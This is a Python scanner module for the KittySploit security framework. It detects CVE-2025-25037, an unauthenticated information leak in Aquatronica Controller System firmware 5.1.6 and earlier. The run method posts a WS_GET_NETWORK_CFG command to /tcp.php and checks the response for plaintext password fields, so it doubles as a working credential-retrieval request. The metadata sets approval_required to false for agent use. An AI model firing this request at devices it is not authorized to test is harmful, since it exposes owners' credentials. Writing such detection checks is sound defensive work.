#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Aquatronica Controller System firmware 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Aquatronica Controller System <= 5.1.6 - Information Disclosure Detection',
        'description': 'Aquatronica Controller System firmware 5.1.6 and earlier and web interface 2.0 and earlier contain an information disclosure vulnerability caused by unauthenticated access to tcp.php endpoint, letting remote attackers retrieve sensitive configuration data including plaintext credentials, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'aquatronica', 'info-leak', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5824.php',
            'https://www.exploit-db.com/exploits/52028',
            'https://vulncheck.com/advisories/aquatronica-controller-system-credential-leak',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-25037',
        ],
        'cve': 'CVE-2025-25037',
    }

    def run(self):
        path = '/tcp.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('WEB_PASSWORD', 'pwd=&quot;',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Aquatronica Controller System <= 5.1.6 - Information Disclosure detected', path=path)
            return True
        return False

